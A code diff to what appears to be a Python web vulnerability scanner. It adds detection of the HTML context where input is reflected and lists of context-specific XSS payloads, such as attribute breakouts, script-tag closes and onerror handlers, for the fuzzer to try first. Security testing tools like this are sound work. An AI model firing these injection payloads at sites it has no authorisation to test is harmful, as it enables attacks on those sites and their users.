@@ -35,6 +35,106 @@ _HREF_INDICATORS    = re.compile(r"href\s*=\s*['\"]?\s*javascript:", re.I)
 _SRC_INDICATORS     = re.compile(r"src\s*=\s*['\"]?\s*javascript:", re.I)
 
 
+def _detect_reflection_context(html_text: str, canary: str) -> str:
+    """
+    Detect where `canary` appears in the HTML and return a context label:
+      'script'    — inside a <script>...</script> block
+      'attr'      — inside an HTML attribute value (quoted or unquoted)
+      'comment'   — inside <!-- ... -->
+      'style'     — inside a <style>...</style> block
+      'html'      — bare HTML text node (default)
+
+    Knowing the context lets us pick payloads most likely to execute
+    without having to try every variant.
+    """
+    if not canary or canary not in html_text:
+        return "html"
+
+    pos = html_text.find(canary)
+    # Inspect the 300 chars before the canary
+    before = html_text[max(0, pos - 300): pos]
+
+    # Inside a script block?
+    last_open_script  = before.rfind("<script")
+    last_close_script = before.rfind("</script")
+    if last_open_script > last_close_script:
+        return "script"
+
+    # Inside a style block?
+    last_open_style  = before.rfind("<style")
+    last_close_style = before.rfind("</style")
+    if last_open_style > last_close_style:
+        return "style"
+
+    # Inside an HTML comment?
+    last_open_comment  = before.rfind("<!--")
+    last_close_comment = before.rfind("-->")
+    if last_open_comment > last_close_comment:
+        return "comment"
+
+    # Inside an attribute value? (look for unmatched quote after last tag open)
+    last_tag_start = before.rfind("<")
+    if last_tag_start != -1:
+        tag_section = before[last_tag_start:]
+        # Count quotes — if odd number of " or ' → we're inside an attribute value
+        if tag_section.count('"') % 2 == 1:
+            return "attr_double"
+        if tag_section.count("'") % 2 == 1:
+            return "attr_single"
+
+    return "html"
+
+
+# Context-optimised payload sets (short lists — tried FIRST before the wordlist)
+_CTX_PAYLOADS: Dict[str, List[str]] = {
+    "script": [
+        # Already inside JS — just close the string/expression
+        "';alert(1);//",
+        "\";alert(1);//",
+        "</script><script>alert(1)</script>",
+        "`;alert(1);//",
+        "-alert(1)-",
+        "\\';alert(1);//",
+    ],
+    "attr_double": [
+        "\" onmouseover=\"alert(1)",
+        "\" autofocus onfocus=\"alert(1)",
+        "\" onload=\"alert(1)",
+        "\"><img src=x onerror=alert(1)>",
+        "\"><script>alert(1)</script>",
+    ],
+    "attr_single": [
+        "' onmouseover='alert(1)",
+        "' autofocus onfocus='alert(1)",
+        "'><img src=x onerror=alert(1)>",
+        "'><script>alert(1)</script>",
+    ],
+    "comment": [
+        "-->alert(1)<!--",
+        "--><script>alert(1)</script><!--",
+        "--><img src=x onerror=alert(1)><!--",
+    ],
+    "style": [
+        "</style><script>alert(1)</script>",
+        "expression(alert(1))",
+        "</style><img src=x onerror=alert(1)>",
+    ],
+    "html": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "\"><script>alert(1)</script>",
+        "'><script>alert(1)</script>",
+        "<details open ontoggle=alert(1)>",
+    ],
+}
+
+
+def _context_payloads(context: str) -> List[str]:
+    """Return the high-priority payloads for the detected context."""
+    return list(_CTX_PAYLOADS.get(context, _CTX_PAYLOADS["html"]))
+
+
 def _is_xss_executable(payload: str, response_text: str) -> bool:
     """
     Return True only when the reflected payload retains its dangerous characters
@@ -173,22 +273,35 @@ class XSSScanner(BaseScanner):
                 logger.warning(f"[XSS] Canary probe failed for {invoked}: {exc!r}")
                 continue
 
-            # Parameter reflects input — fuzz with payloads
-            self._fuzz_xss_parallel(url, param_name, baseline_text)
+            # Detect HTML context — choose context-appropriate payloads
+            ctx = _detect_reflection_context(probe_res.text, canary)
 
-    def _fuzz_xss_parallel(self, url: str, param_name: str, baseline_text: str):
-        payloads = self.get_smart_payloads("xss", param_name)
-        if not payloads:
-            payloads = [
+            # Parameter reflects input — fuzz with context-aware payloads
+            self._fuzz_xss_parallel(url, param_name, baseline_text, context=ctx)
+
+    def _fuzz_xss_parallel(self, url: str, param_name: str, baseline_text: str,
+                           context: str = "html"):
+        base_payloads = self.get_smart_payloads("xss", param_name)
+        if not base_payloads:
+            base_payloads = [
                 "<script>alert(1)</script>",
                 "\"><script>alert(1)</script>",
                 "<img src=x onerror=alert(1)>",
                 "javascript:alert(1)",
                 "'-alert(1)-'",
             ]
-        payloads = list(payloads) + Mutator.mutate_polyglot("alert(1)")
+
+        # Context-aware payload selection — prepend the most likely-to-work payloads
+        ctx_payloads = _context_payloads(context)
+        payloads = ctx_payloads + [p for p in list(base_payloads) if p not in ctx_payloads]
+        payloads = payloads + Mutator.mutate_polyglot("alert(1)")
         if len(payloads) > self.MAX_URL_PAYLOADS:
-            payloads = random.sample(payloads, self.MAX_URL_PAYLOADS)
+            # Always keep the context-specific ones; sample from the rest
+            keep = payloads[:len(ctx_payloads)]
+            rest = random.sample(payloads[len(ctx_payloads):],
+                                 min(self.MAX_URL_PAYLOADS - len(keep),
+                                     len(payloads) - len(ctx_payloads)))
+            payloads = keep + rest
 
         def probe(payload: str) -> Optional[Dict]:
             actual = payload
